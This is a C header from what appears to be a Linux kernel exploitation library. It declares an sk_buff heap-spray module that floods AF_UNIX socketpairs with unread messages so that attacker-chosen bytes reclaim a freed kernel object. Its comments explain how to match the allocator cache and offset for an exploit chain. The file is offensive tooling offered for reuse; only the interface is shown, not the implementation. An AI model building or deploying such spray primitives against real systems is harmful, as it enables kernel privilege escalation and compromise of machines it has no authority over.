/* lib/spray/skbspray.h -- filling freed kernel memory with chosen bytes.
 *
 * A message queued on a socket and never read holds a kernel buffer containing
 * the sender's bytes. Sending many such messages after an object is freed gives
 * the allocator repeated opportunities to hand that object's memory back as one
 * of these buffers -- which puts the caller's content where the freed object
 * was.
 *
 * Two properties are the caller's to get right, and this module deliberately
 * does not guess at either. The buffer must come from the same allocator cache
 * the freed object did, which fixes the message size. And the copied bytes do
 * not start at the beginning of the allocation -- the kernel places its own
 * bookkeeping first -- so a caller aiming at a specific offset must account for
 * that displacement itself, using the figure the target description states.
 *
 * The messages must not be read back until the chain is done: reading frees the
 * buffer and undoes the placement.
 */
#ifndef LIB_SKBSPRAY_H
#define LIB_SKBSPRAY_H

#include <stddef.h>
#include <sys/socket.h>

/* Default per-socket send buffer (bytes). Big enough to hold many queued,
 * unread datagrams so the spray is not throttled by the socket wmem cap.
 * Not a device constant — just a spray-shaping default; override before init
 * by setting s->sndbuf after zeroing the struct, or #define to change it. */
#ifndef LIB_SKB_DEFAULT_SNDBUF
#define LIB_SKB_DEFAULT_SNDBUF (8 * 1024 * 1024)
#endif

struct lib_skb_spray {
	int (*sv)[2];   /* nsockets socketpairs; [i][0]=send end, [i][1]=peer  */
	int nsockets;   /* number of socketpairs                               */
	int per_socket; /* queued sends per socket in one fire                 */
	size_t payload_len; /* bytes per send (the kmalloc data length)        */
	int sock_type;  /* SOCK_DGRAM (default) or SOCK_STREAM                  */
	int sndbuf;     /* SO_SNDBUF applied to each send end                   */
};

/* Create nsockets AF_UNIX socketpairs of s->sock_type (default SOCK_DGRAM if
 * the field is 0) and raise SO_SNDBUF on each send end. payload_len is the
 * per-send data length. Returns 0 on success, -1 on failure (errno set; any
 * partially-created state is torn down before returning). The struct should be
 * zeroed by the caller first; sock_type/sndbuf left at 0 take their defaults. */
int lib_skb_spray_init(struct lib_skb_spray *s, size_t payload_len,
                       int nsockets, int per_socket);

/* sendmsg `payload` (payload_len bytes) into every socket per_socket times,
 * with MSG_DONTWAIT. On a per-socket send error (queue full etc.) that socket's
 * inner loop stops and the next socket continues. Returns the number of sends
 * that succeeded, or -1 if the spray was not initialised. */
int lib_skb_spray_fire(struct lib_skb_spray *s, const void *payload);

/* Close every socket and free internal state. Safe on a zeroed or already-freed
 * struct. */
void lib_skb_spray_free(struct lib_skb_spray *s);

#endif /* LIB_SKBSPRAY_H */
